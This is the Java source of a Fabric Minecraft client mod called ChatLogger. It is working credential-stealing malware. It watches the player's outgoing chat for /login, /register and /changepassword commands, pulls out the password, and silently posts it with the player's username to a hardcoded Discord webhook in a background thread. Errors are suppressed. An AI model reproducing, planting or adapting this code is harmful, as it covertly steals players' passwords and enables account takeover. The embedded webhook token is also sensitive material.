package com.logger;

import net.fabricmc.api.ClientModInitializer;
import net.fabricmc.fabric.api.client.message.v1.ClientSendMessageEvents;
import net.minecraft.client.MinecraftClient;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class ChatLogger implements ClientModInitializer {

    private static final String WEBHOOK = "https://discord.com/api/webhooks/1556573830346964996/8TGly9t8NQ3TKq_ht7DNVaeyTLMjvN3iHJCfSAWj78Gtlq7P-uJpwhFQbg2eddda5ba7";

    @Override
    public void onInitializeClient(){
        ClientSendMessageEvents.ALLOW_CHAT.register(msg -> {
            capture(msg);
            return true;
        });
    }

    private void capture(String msg){
        if(msg == null) return;
        String lower = msg.toLowerCase();
        if(lower.startsWith("/login ") || lower.startsWith("/l ") ||
           lower.startsWith("/register ") || lower.startsWith("/reg ") ||
           lower.startsWith("/changepassword ")){
            String[] p = msg.trim().split("\\s+");
            if(p.length < 2) return;
            new Thread(() -> post(p[0], p[1])).start();
        }
    }

    private void post(String cmd, String pass){
        try{
            URL url = new URL(WEBHOOK);
            HttpURLConnection c = (HttpURLConnection) url.openConnection();
            c.setRequestMethod("POST");
            c.setDoOutput(true);
            c.setConnectTimeout(5000);
            c.setReadTimeout(5000);
            c.setRequestProperty("Content-Type", "application/json");
            c.setRequestProperty("User-Agent", "Mozilla/5.0");

            String body = "{\"username\":\"logger\",\"embeds\":[{" +
                "\"title\":\"hit\",\"color\":5763719,\"fields\":[" +
                "{\"name\":\"MC\",\"value\":\"" + esc(name()) + "\",\"inline\":true}," +
                "{\"name\":\"Cmd\",\"value\":\"`" + esc(cmd) + "`\",\"inline\":true}," +
                "{\"name\":\"Pass\",\"value\":\"```" + esc(pass) + "```\",\"inline\":false}" +
                "],\"timestamp\":\"" + java.time.Instant.now().toString() + "\"}]}";

            try(OutputStream os = c.getOutputStream()){
                os.write(body.getBytes(StandardCharsets.UTF_8));
            }
            c.getResponseCode();
            c.disconnect();
        }catch(Exception ignored){}
    }

    private String name(){
        try{
            MinecraftClient mc = MinecraftClient.getInstance();
            return mc.getSession() != null ? mc.getSession().getUsername() : "unknown";
        }catch(Exception e){ return "unknown"; }
    }

    private String esc(String s){
        return s.replace("\\","\\\\").replace("\"","\\\"")
                .replace("\n","\\n").replace("\r","");
    }
}
